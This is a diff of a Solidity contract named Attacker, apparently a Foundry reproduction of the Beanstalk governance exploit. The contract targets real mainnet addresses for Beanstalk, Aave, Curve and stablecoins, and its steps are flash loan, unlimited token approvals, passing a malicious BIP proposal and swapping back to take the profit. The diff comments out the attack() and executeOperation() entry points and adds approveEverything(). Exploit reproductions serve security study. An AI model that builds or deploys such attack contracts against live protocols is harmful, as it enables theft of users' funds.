@@ -2,8 +2,12 @@ pragma solidity ^0.8.13;
  
 import "@oz/token/ERC20/ERC20.sol";
 import "@oz/token/ERC20/utils/SafeERC20.sol";
-import "@uniswap-v2-periphery/interfaces/IUniswapV2Router02.sol";
+//  import "@uniswap-v2-periphery/interfaces/IUniswapV2Router02.sol";
+import "../lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import "forge-std/console.sol";
+import "./IAaveLendPool.sol";
+import "./IBeanstalk.sol";
+
  
 contract Attacker {
    using SafeERC20 for ERC20;
@@ -12,6 +16,14 @@ contract Attacker {
    ERC20 bean = ERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    address beanStalk = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;
    IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
+    address crvbean = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
+ 
+   ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+   ERC20 usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+   ERC20 threeCrv = ERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
+ 
+   IAaveLendingPool aavelendingPool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+   ICurvePool threeCrvPool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
  
  
    function proposeBip() external payable {
@@ -30,17 +42,32 @@ contract Attacker {
        submitProposal();
    }
  
-   function attack() external {
-       approveEverything();
+//    function attack() external {
+//        approveEverything();
  
-       flashloanAave();
+//        flashloanAave();
  
-       console.log(
-           "Final profit, usdc balance of attacker: %s",
-           usdc.balanceOf(address(this)) / (10**usdc.decimals())
-       );
+//        console.log(
+//            "Final profit, usdc balance of attacker: %s",
+//            usdc.balanceOf(address(this)) / (10**usdc.decimals())
+//        );
       
-       usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
+//        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
+//    }
+
+
+   function approveEverything() internal {
+       dai.safeApprove(address(aavelendingPool), type(uint256).max);
+       usdc.safeApprove(address(aavelendingPool), type(uint256).max);
+       usdt.safeApprove(address(aavelendingPool), type(uint256).max);
+ 
+       dai.safeApprove(address(threeCrvPool), type(uint256).max);
+       usdc.safeApprove(address(threeCrvPool), type(uint256).max);
+       usdt.safeApprove(address(threeCrvPool), type(uint256).max);
+      
+       threeCrv.safeApprove(crvbean, type(uint256).max);
+ 
+       ERC20(crvbean).safeApprove(beanStalk, type(uint256).max);
    }
 
    function swapEthForBean() internal {
@@ -192,18 +219,18 @@ function flashloanAave() internal {
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }
  
-   function executeOperation(
-       address[] calldata,
-       uint256[] calldata amounts,
-       uint256[] calldata premiums,
-       address,
-       bytes calldata
-   ) external returns (bool) {
-       getCurveBean(amounts);
-       passBip();
-       swapCurveBeanBack(amounts, premiums);
-       return true;
-   }
+//    function executeOperation(
+//        address[] calldata,
+//        uint256[] calldata amounts,
+//        uint256[] calldata premiums,
+//        address,
+//        bytes calldata
+//    ) external returns (bool) {
+//        getCurveBean(amounts);
+//        passBip();
+//        swapCurveBeanBack(amounts, premiums);
+//        return true;
+//    }
 
 
 
